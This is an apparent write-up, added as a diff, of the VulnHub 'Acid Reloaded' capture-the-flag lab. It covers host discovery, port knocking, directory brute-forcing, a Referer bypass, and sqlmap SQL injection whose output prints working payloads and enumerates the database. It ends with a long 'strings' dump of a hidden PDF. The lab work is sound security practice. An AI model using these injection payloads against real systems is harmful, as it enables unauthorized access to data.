@@ -1,0 +1,3387 @@
+URL : https://www.vulnhub.com/entry/acid-reloaded,127/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 172.17.187.0/16   |   Screen View: Unique Hosts                                                                                                                                              
+
+ 28 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1680                                                                                                                                                
+ _____________________________________________________________________________ 
+   IP            At MAC Address      Count  Len   MAC Vendor                                                                                                                                                      
+ -----------------------------------------------------------------------------                                                                                                                                    
+ 192.168.174.132 00:0c:29:91:1b:81    14    840   VMware, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:ff:fc:d3    12    720   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:ff:b0:47    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+ 
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-19 21:31 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.00037s latency).
+Not shown: 65533 closed ports
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+33447/tcp filtered unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=11/19%Time=564E860B%P=i686-pc-linux-gnu%r(NULL,
+SF:29,"SSH-2\.0-OpenSSH_6\.7p1\x20Ubuntu-5ubuntu1\.3\r\n");
+MAC Address: 00:0C:29:91:1B:81 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.37 ms 192.168.174.132
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.28 seconds
+root@kali:~# 
+
+3.) Enumerate SSH
+root@kali:~# ssh root@192.168.174.132
+The authenticity of host '192.168.174.132 (192.168.174.132)' can't be established.
+ECDSA key fingerprint is a0:a6:52:fb:2c:32:b7:08:b4:ed:61:1d:2d:fa:c8:58.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.174.132' (ECDSA) to the list of known hosts.
+    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
+   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
+  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
+ / ___ \ |___ | || |_| |_____|  _ <| |___| |__| |_| / ___ \| |_| | |___| |_| |
+/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
+
+									-by Acid
+
+Wanna Knock me out ??? 
+3.2.1 Let's Start the Game.
+                                                                              
+root@192.168.174.132's password: 
+
+4.) Port Knocking
+root@kali:~# nmap -T4 --max-retries=0 -p3 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-19 22:20 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.00031s latency).
+PORT  STATE  SERVICE
+3/tcp closed compressnet
+MAC Address: 00:0C:29:91:1B:81 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+root@kali:~# nmap -T4 --max-retries=0 -p2 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-19 22:20 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.00035s latency).
+PORT  STATE  SERVICE
+2/tcp closed compressnet
+MAC Address: 00:0C:29:91:1B:81 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
+root@kali:~# nmap -T4 --max-retries=0 -p1 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-19 22:20 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.0010s latency).
+PORT  STATE  SERVICE
+1/tcp closed tcpmux
+MAC Address: 00:0C:29:91:1B:81 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-11-19 22:21 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.00061s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     (protocol 2.0)
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+|_http-title: Acid-Reloaded
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=11/19%Time=564E91A6%P=i686-pc-linux-gnu%r(NULL,
+SF:29,"SSH-2\.0-OpenSSH_6\.7p1\x20Ubuntu-5ubuntu1\.3\r\n");
+MAC Address: 00:0C:29:91:1B:81 (VMware)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.61 ms 192.168.174.132
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
+root@kali:~# 
+
+5.) Enumerate 33447
+Open in browser
+http://192.168.174.132:33447/
+Run dirbuster
+root@kali:~# dirbuster 
+Starting OWASP DirBuster 1.0-RC1
+Starting dir/file list based brute forcing
+Dir found: /bin/crack/ - 403
+Dir found: /bin/ - 200
+Dir found: /bin/js/ - 403
+Dir found: /bin/styles/ - 403
+File found: /bin/index.php - 200
+File found: /bin/error.php - 200
+File found: /bin/dashboard.php - 200
+Dir found: /bin/crack/css/ - 403
+Dir found: /bin/crack/js/ - 403
+root@kali:~#
+
+Access /bin/
+http://192.168.174.132:33447/bin/
+In page source
+<form  action="includes/validation.php" method="post" name="login_form"> 
+The login is processed by validation.php and if successful it is redirected to dashboard.php
+http://192.168.174.132:33447/bin/dashboard.php
+Now process the URL http://192.168.174.132:33447/bin/dashboard.php with http://192.168.174.132:33447/bin/includes/validation.php as the referrer
+Now we are greeted witth the page http://192.168.174.132:33447/bin/l33t_haxor.php
+In Page source:
+<img src='http://assets-s3.usmagazine.com/uploads/assets/articles/85688-success-kid-meme-kidney-sick-father/1429037342_success-kid-meme-lg.jpg'><a href="l33t_haxor.php?id=" style="text-decoration:none"></a> <h3></font>
+Check for SQL injection in the 'id' parameter
+http://192.168.174.132:33447/bin/l33t_haxor.php?id=
+http://192.168.174.132:33447/bin/l33t_haxor.php?id='
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''') ORDER BY Description ASC' at line 1
+A space in the id parameter gives us a different result
+http://192.168.174.132:33447/bin/l33t_haxor.php?id=1 '
+We can use the sqlmap tamper script(space2comment) which replaces space character (' ') with comments '/**/'
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.132:33447/bin/l33t_haxor.php?id=1" --dbs -p "id" --tamper=space2comment
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151118}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:30:18
+
+[23:30:18] [INFO] loading tamper script 'space2comment'
+[23:30:18] [INFO] testing connection to the target URL
+[23:30:18] [INFO] heuristics detected web page charset 'ascii'
+[23:30:18] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+[23:30:18] [INFO] testing if the target URL is stable
+[23:30:19] [INFO] target URL is stable
+[23:30:19] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[23:30:19] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to XSS attacks
+[23:30:19] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[23:30:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[23:30:26] [WARNING] reflective value(s) found and filtering out
+[23:30:26] [INFO] GET parameter 'id' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[23:30:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[23:30:26] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
+[23:30:26] [INFO] testing 'MySQL inline queries'
+[23:30:26] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
+[23:30:26] [WARNING] time-based comparison requires larger statistical model, please wait...............                                                                                                          
+[23:30:26] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT)'
+[23:30:26] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
+[23:30:26] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[23:30:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[23:30:26] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[23:30:26] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
+[23:30:36] [INFO] GET parameter 'id' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
+[23:30:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[23:30:36] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[23:30:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[23:30:36] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[23:30:36] [INFO] target URL appears to have 2 columns in query
+[23:30:36] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1') AND 1721=1721 AND ('pELY'='pELY
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=1') AND (SELECT 8307 FROM(SELECT COUNT(*),CONCAT(0x71716a7171,(SELECT (ELT(8307=8307,1))),0x7171626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('bQTq'='bQTq
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=1') AND (SELECT * FROM (SELECT(SLEEP(5)))bpBX) AND ('FiBw'='FiBw
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-4864') UNION ALL SELECT NULL,CONCAT(0x71716a7171,0x416974795a45485161666a4654627653614866724e7547544c5942565857714f54786847484d4274,0x7171626b71)#
+---
+[23:30:58] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[23:30:58] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0
+[23:30:58] [INFO] fetching database names
+[23:30:58] [INFO] the SQL query used returns 4 entries
+[23:30:58] [INFO] retrieved: information_schema
+[23:30:58] [INFO] retrieved: mysql
+[23:30:58] [INFO] retrieved: performance_schema
+[23:30:58] [INFO] retrieved: secure_login
+available databases [4]:                                                                                                                                                                                          
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] secure_login
+
+[23:30:58] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.132'
+
+[*] shutting down at 23:30:58
+
+root@kali:~/Downloads/sqlmap-master# 
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.132:33447/bin/l33t_haxor.php?id=1" -D secure_login --tables  -p "id" --tamper=space2comment
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151118}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:33:48
+
+[23:33:48] [INFO] loading tamper script 'space2comment'
+[23:33:48] [INFO] resuming back-end DBMS 'mysql' 
+[23:33:48] [INFO] testing connection to the target URL
+[23:33:48] [INFO] heuristics detected web page charset 'ascii'
+[23:33:48] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1') AND 1721=1721 AND ('pELY'='pELY
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: id=1') AND (SELECT 8307 FROM(SELECT COUNT(*),CONCAT(0x71716a7171,(SELECT (ELT(8307=8307,1))),0x7171626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('bQTq'='bQTq
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=1') AND (SELECT * FROM (SELECT(SLEEP(5)))bpBX) AND ('FiBw'='FiBw
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-4864') UNION ALL SELECT NULL,CONCAT(0x71716a7171,0x416974795a45485161666a4654627653614866724e7547544c5942565857714f54786847484d4274,0x7171626b71)#
+---
+[23:33:48] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[23:33:48] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL 5.0
+[23:33:48] [INFO] fetching tables for database: 'secure_login'
+[23:33:48] [WARNING] reflective value(s) found and filtering out
+[23:33:48] [INFO] the SQL query used returns 4 entries
+[23:33:48] [INFO] retrieved: UB3R/strcpy.exe
+[23:33:48] [INFO] retrieved: login_attempts
+[23:33:48] [INFO] retrieved: members
+[23:33:48] [INFO] retrieved: word
+Database: secure_login                                                                                                                                                                                            
+[4 tables]
++-----------------+
+| UB3R/strcpy.exe |
+| login_attempts  |
+| members         |
+| word            |
++-----------------+
+
+[23:33:48] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.132'
+
+[*] shutting down at 23:33:48
+
+root@kali:~/Downloads/sqlmap-master# 
+Download the binary
+http://192.168.174.132:33447/UB3R/strcpy.exe
+
+6.) Examine the binary
+root@kali:~/Desktop# file strcpy.exe 
+strcpy.exe: PDF document, version 1.5
+root@kali:~/Desktop# strings strcpy.exe 
+%PDF-1.5
+1 0 obj
+<</Type/Catalog/Pages 2 0 R/Lang(en-IN) /StructTreeRoot 11 0 R/MarkInfo<</Marked true>>>>
+endobj
+2 0 obj
+<</Type/Pages/Count 1/Kids[ 3 0 R] >>
+endobj
+3 0 obj
+<</Type/Page/Parent 2 0 R/Resources<</XObject<</Image5 5 0 R>>/ExtGState<</GS6 6 0 R/GS9 9 0 R>>/Font<</F1 7 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] >>/MediaBox[ 0 0 595.32 841.92] /Contents 4 0 R/Group<</Type/Group/S/Transparency/CS/DeviceRGB>>/Tabs/S/StructParents 0>>
+endobj
+4 0 obj
+<</Filter/FlateDecode/Length 149>>
+stream
+(K36C
+!cm-
+n%%GL$cN
+endstream
+endobj
+5 0 obj
+<</Type/XObject/Subtype/Image/Width 461/Height 419/ColorSpace/DeviceRGB/BitsPerComponent 8/Filter/DCTDecode/Interpolate true/Length 26698>>
+stream
+JFIF
+Exif
+UNICODE
+ $.' ",#
+(7),01444
+'9=82<.342
+!22222222222222222222222222222222222222222222222222
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+	#3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+m%-s
+zT0,
+U(&L
+ug$e
+4Y?g
+$[kCn
+W'i^q
+:i U[g-
+iwWR	
+-bkS-
+=0sH
+%Q$N
+1OZk6
+U~jiZC
+KIKX
+--I7
+_T|o
+.nZ 
+5 GB
+,S&y]
+u	cS
+TOcJ
+hz@4R
+W-)_
+2!ie
+l<```v
+eFWO
+v57v
+jY_b5'
+w-E3^
+`m3C>7
+SeTz&z5
+T`|U
+P&4->
+TP=%+
+w-ZW)+
+- )y
++SnQ
+E(Z)
+y:T)R
+NzmX
+2VL	R
+35"[
+Ry]|
+rYUU
+_5k'Q
+w3Vlh
+!Lz}D
+h/up
+k*k'Eo
+Wusd
+:68Y
+e-.i*v
+h+KHhN
+/QE%fH
+QIR+
+-Cc%
+AE!I\
+mEFkE]
+75s-OE;"
+2nfj
+w)\w
+rUF_
+%Ic*)j
+Zz50,n
+k@3v
+kFLw3
+gJCf
+04]j
+Yw5J
+K+,J
+q76V
+;_:)~Ff
+j#R+
+/+j{
+%AeT
+~Z`O
+NJ6T
+7y)\c%
+-tSx
+qAFQ
+V+Cx
+->`!
+Ss-7o
+>SOz
+jhw<
+goJ|
+eGde
+p<W[
+EGdE8
+gg*DZ
+er_SD
+"E;_
+>jz'
+[k7zw
+^{s:4
+YwS'
+c7cn
+ohmc7cQ
+j$UJ
+"J|k
+fWV_
++35P
+Ton,n
+f?|kU
+d}*g-@
+T3E@
+-5w=e"
+=oiQ|
+&xag
+l-VkMM
+5\crd
+[J)Q~Z]
+}]~F
+,bX&nMlJ
+"2%X
+>Zs%>c
+5"-ADl
+;iBm
+!QF=
+<?2T
+PiPeZ
+9zCO
+r%l_A
+T5+X
+-Ys_
+T[Ke
+Z7-g
+.usKn
+9+^%
+*+=ZH
+<Akqx
+k(V]
+gvvo
+XW6i
+YwU)
++E2\lg
+Yme*
+^]\=H
+#5eX
+z-A2
+DgWc
+5te~U
+Tlf}
+9\W5
+ukc!
+7A7*
+iWu`
+Zr>e
+Tn"U
+mFGi~W
+mt^$
+QIKTIj
+(n%O
+M^eG
+0>Q\
+}WW%N
+.5xWr
+Msa-
+UQ>Z
++9SJ
+b)_k
+)J!_
+jn"-
+M^qc
+BM] 
+$qSh
+.Uc-
+m^+]
+l++Dv
+"wuDVfn
+N'5g
+M;u6
+<=ks
+\2mo
+"+8~
+Zut&dCOT
+U To
+k2xf
+5dfdX
+W%|J
+|Ci6
+ZrXi
+nj/szpP4
+#35d\
+SkTp
+SHVti
+C]GOi
+tV9[
+vL5s
+QW!f
+o5~j.f
+s{-T
+iX$w
+-h)a
+<BeA2
+2*<k<l
+6+OU
+L$3#*
+k-GO
+G\*)
+=j	O
+ ~dUF,
+kZ'I
+UKbi
+{kMr
+I+X[Kcel
+ZZW=o
+625f
+he}:
+7vfP
+BVI.
+l|/mc
+iW^$
+	uxt
+iWW2	
+Qwto\~5
+^h2Y6
+._t{
+U~0x/D
+MBKMFK
+MuvZO
+$l"F0
+_F*;
+.gKK
+Ik}Vk
+}wosy
+5eM7]
+c_,\
+]OPA8"
+1DCz
+mzkWM
+MHD^d
+wO(S
+o24Vw
+Mrn%ie
+DQg-
+KmK[
+8%{d
+>`d_(2
+GUV+
+[j7z^
+p?!S
+6YU..
+Lj?hk
++Z^x
+NClI
+}R]N
+>"Yc
+Rh"ux
+*yk%
+,3g/?
+_0Yx
+G$zV
+gbrX
+;sL.B
+ppqq
+..$>i
+41+<
+{p$3L
+d*{c
+[Cq.
+%H`q
+BM3&
+S{)y'
+$rEQ
+Cik$
+(&7k
+arn|"u;
+:qSh
+lu_	
+=sT{t
+e!pA
+endstream
+endobj
+6 0 obj
+<</Type/ExtGState/BM/Normal/ca 1>>
+endobj
+7 0 obj
+<</Type/Font/Subtype/TrueType/Name/F1/BaseFont/ABCDEE+Calibri/Encoding/WinAnsiEncoding/FontDescriptor 8 0 R/FirstChar 32/LastChar 32/Widths 20 0 R>>
+endobj
+8 0 obj
+<</Type/FontDescriptor/FontName/ABCDEE+Calibri/Flags 32/ItalicAngle 0/Ascent 750/Descent -250/CapHeight 750/AvgWidth 521/MaxWidth 1743/FontWeight 400/XHeight 250/StemV 52/FontBBox[ -503 -250 1240 750] /FontFile2 21 0 R>>
+endobj
+9 0 obj
+<</Type/ExtGState/BM/Normal/CA 1>>
+endobj
+10 0 obj
+<</Author(Avinash Thapa) /Creator(
+3) /CreationDate(D:20150823182314+05'30') /ModDate(D:20150823182314+05'30') /Producer(
+3) >>
+endobj
+18 0 obj
+<</Type/ObjStm/N 8/First 53/Filter/FlateDecode/Length 326>>
+stream
+CPIkE
+e,dlt#
+endstream
+endobj
+20 0 obj
+[ 226] 
+endobj
+21 0 obj
+<</Filter/FlateDecode/Length 79317/Length1 176128>>
+stream
+}	`T
+(UlU
+PqmS
+2v{)cc
+2cMH
+=}Q]k
+w.j>s
+MUwLbl	
+`zTX
+B~)rM
+f_~.A-a
+{xfW
+KwR(
+e-KO[
+-llX0
+;ftuUe
+.?8fL
+Z[QCE
+:TjW
+ZCi?[
+Pqa$
+`@,UUm
+{x]@{
+,,Fn
+5Lb9
+u{]gW
+E{plC{pz
+t}'g
+w*ds
+4s'o
+`Q%8
+5	3\G[$
+YcE_
+%tvm
+-f{t
+E:z,
+ACb8
+L1x>mV
+aWyEm
+/E?)
+)R$K
+}R</
+sR<+
+3R<-
+SR<)
+n)vI
+5R\-
+UR\)
+ER\(E
+=\^{
+=\^{
+?\^{
+.o;\
+[s,g
+j%ZN
+-&j"ZD
+(BTCt2
+TITA4
+h(U/#*%
+dP:Q
+dL!J&rQ
+)2>I
+N'ZI
+iTr	Q3
+'Z@TGTK4
+,j:B/
+*B#S
+>wG[
+]{v.
+p]imx~
+\:)<	
+cLxtiu
+WMvd
+t]J(
+	evq
+"|%RZF
+Ld"2
+S}7@_
+$`80
+@'p/p
+oULa
+>9ry
+vh5>7^
+l=Vm#
+::[gc
++hR7h
+twE|'
+a{8n
+^DeFV
+q%01
+D5lnV]
+H1)G
+uMf>6
+L%5d6{
+GICQ
+X9GV
+9^VL
+(3Cy'8
+[&<A
+%dI	T[
+zzuI
+$QwW
+n5_s
+92pR
+fZ5q
+ruAZ
+MV36
+npeO
+#355
+Kz/+b
+;{d2
+6J{O
+_RtF
+cS<6
+dHJg
+!--f
+,ine
+87:=
+'b"&b"&b"&
+7$b"&b"&b"&b"&b"&b"&b"
+V:IK	
+xm\+
+2zf3
+n\WT
+E@DED
+aYI$
+GmOw
+fm*-
+F<d;=_
+ZDz(
+z7D-
+Po$o
+Vh\e
+wGFVfF
+@VN )
+j0!+
+|~_ZFR +
+PvB85
+$-;5
+YCl=
+)+##<(
+Annn\Z
+ <,3#%
+prFz8
+`/%eG
+#wP0qP
+$vN(
+_VKj@l
+,{x'e
+Nv83;
+@jf1
+nT>*
++m^i3
+cXVj
+$x	##
+?H<	
+7a\W	
+%<Jx
+L\e	+
+MFVR
+.&\N
+&<Hx
+,.kB
+V	eg
+)l.[
+p1AL
+k6,v~4
+I;;i
+BmA\
+j4fK
+a,Kei0
+UUUU
+xQA5S
+$Q]%
+zL=&nVc
+,nQS
+,5K4Ws
+T}*:
+^=YO
+vu;Z+
+[CuR
+j(4P
+FA#5F
+<CAxB
+ILsPn
+f{&R
+!f@i
+y4C35K
+Z[Px.
+F|{=
+1V<!
+%C2,
+89^>)'
+|F>+'
+T9MN
+7yY^
+a<b<j
+j^4/
+{kxkzkygx_
+.2E&
+`1Zg
+\}M{
+B%s%
+_#n5
+Ly:S
+*X1VE
+\e~M>x
+?VeU9
+zIV^?
+umpm`
+6y;[
+uwqwa
+=jaL
+fXf'
+sLCU4Nw
+-0Nl
+25Y6
+&B]6
+84@;
+~ I/7Fo
+2H//
+O1f@%\
+W,+^Y
+*Mv(
+,>C&
+a83X)le5V
+5f-X;
+El1[
+^JSz{	F
+{tSU
+EP(P
+g9Nvfy
+YN$_
+\ce#
+w6Qk
+\cq3
+e~EC
+}'J&
+ij~1cZ
+i/X^
+_t/s
+OGO'
+{zxzzzyz{
+By3F
+cSey
+eyge
+Z=Uo
+i~V&
+ZOmL
+'"_l
++ClW
+VGH[
+}'v3
+,S\]
+`~~X
+j9^-g
+|@nTK
+9Ws_
+v!o~
+L}No
+xm/Q
+Zy3R
+RPU"w
+2.Z&Pr
+a(K=
+fI-k
+[[IB
+f}*r
+HV~VYV +4
+dMyn
+7egfO
+GrV^,
+=Us&
+z17E
+jN y
+&Z/F
+~s;r
+"g<5\
+"D"\
+**U+f
+nf:joqZc3
+#fFc
+WyWv
+[{r53C3
+16YF
+Bh,wXF
+\U.b
+f	5}.
+&jC7
+%W\m}
+	ca2L
+k|C]
+uhY.
+=i)3
+W8O[
+zf	=
+zf	W
+0=-LO
+GCx4
+b	^,
+5|/F
+RgbeSbeS
+7;1N
+L4!j
+n.r7W
+`'|m
+`7|C
+/f;d
+IGch
+n'v;
+}\w?xa
+$@]H
+xVf<+3
+xVf<+3
+Nvm?	<
+p$C}h
++<NM
+5k/e
+;!Zk
+B_kJGc
+]gi]1
+Wa}:
+K|;Z
+fnt37
+f^t3/
+q?~3
+sv/c
+u3R\X
+^2~q
+({*i
+a9>,
+rw7c
+0!"L
+0!"L
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+B4.D
+GE?*
+GE?*
+GE?*
+JE{T
+twzK
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+C%;T
+ek,[c
+ek,[c
+7k,[c9:H,
+{Yw/
+mzY_/
+k'];
+aS=l
+Hthji4.
+z(5H
+PeGjs
+S{=q
+,WEoeY
+W	?$
+S}MXT
+m?*{9D
+0^lj
+8K}p
+Bwx:f
+l.fs
+Z*{-
+-|J4o
+U4ne#
+([d+
+yy;/o
+}]`_
+=]dO
+^0b/f
+,y7}
+rw[s
+F#m7
+sWYs
+xO_n
+ZO[d
+L9,S
+#2^I
+VR{$2
+ZJTK
+VMtGY
+9.Wi
+VkiUI
+gq.>
+cuXY
+^D#^
+pcm*4
+ftHX
+y!k^
+fNs<
+^F3Z
+C?t,
+7pAX
+'DS<
+Dv>1
+vtaT
+ivuZ
+/:0uj4.u
+0+5!\
+q81L
+S&f>
+"Ls>
+1Ua]
+7w3n
+U^U~{
+@I%PR	
+@I%PR	
+@I%PR	
+T4=K4=K4=K4=K4=K4
+@d_ 
+2Q^&
+2Q^&
+2Q^&
+r%Y.
+9Y4'
+:3Qg&
+:3Qg&
+t	E]BQ
+EQGQ
+.V9\
+gF9=q
+wHT89
+waXQ
+p~8Wewn
+{.z8
+O}?J
+;Qfc
+Wa*~
+VamXR
+[pth
+`~XR
+0&<~@
+V~5-$
+XDE1
+#Rcl
+\8?\
+N<{?
+Q3]Q
+a&3C^LMe
+0?>j
+ r-@
+s,*#M%h
+3!%[Q
+^-'Qk9
+v4Ub4U"
+ZP;$
+h;!w)
+JExM
+LjSr
+LC|-
+e2xM!_
+NWV@
+DgF^
+j-dB
+tiHS
+@ZeC
+-t+Bo
+L[XG
+[ bE<
+h!.a[DKq
+`;Dk
+%fqO|.
+'cxs
+|;}{
+nG91
+yFtv
+r^q^
+:SEo
+R]#~U
+z^:j
+2^MP
+de5QM
+t5GVU
+)-ov
+ 9;080L
+z_y?8
+y2$C
+Dgd()
+J	Uw^
+BcB/9
+WB~ ;
+l4p4
+,!O#
+5q6*
+h$|/
+]UhN
+0Z<=
+it::jt:
+cF'b
+*1Uy 
+aVb8$f
+JV"kX
+V"=+
+r\qP
+^n!.
+YmCY
+L!f0
+Vo+%zY^
+))dT
+(@UB
+*#$!
+&\oV
+#!T#T
+\SCS
+Mo7.z
+5:Cg
+.S@g
+a;KZ]
+v!*z
+VF3~
+=PK!
+D	cX
+`wtwI
+YBoGo>
+wbH4
+yS&:
+L;-~
+3yDf
+V,J{G
+Sf~0
+%~+UjY
+(1S~Z
+]5?5:D
+lx<y9:\
+u`v_?
+;0&m
+gSC;r
+xsZb
+}x_Z
+=nO>
+qa -PW\j
+;m"l
+?&>&A
+}q^A
+*k/4
+M,j7
+WZL?
+$:K$
+q	b[
+^&.C
+btYN
+|+}+)
+Qv>PM
+Uw>	
+M8J37c
+odE"
+a"+6
+`&6]0
+DV-+
+ 'V"
+j-*oJ
+iAAZP
+?%~*
+Ce(a
+&|/a
+t@VX
+Wbf0(
+=/S~O-
+	C:J
+qyqy
+?FEp?'
+JL_EL
+c|	/
+z.#b.
+%O'J~
+wa/A
+	Pr9Q
+|\J|\F|
+OE_0
+qp%q
+B)b)
+"VK)b
+N)bzJ
+R(El
+})b)
+@)b)
+N)bzJ
+})bzJ
+/R~X
+R!=&=
+gJ3Y
+)#o3
+S.}S
+|N	9
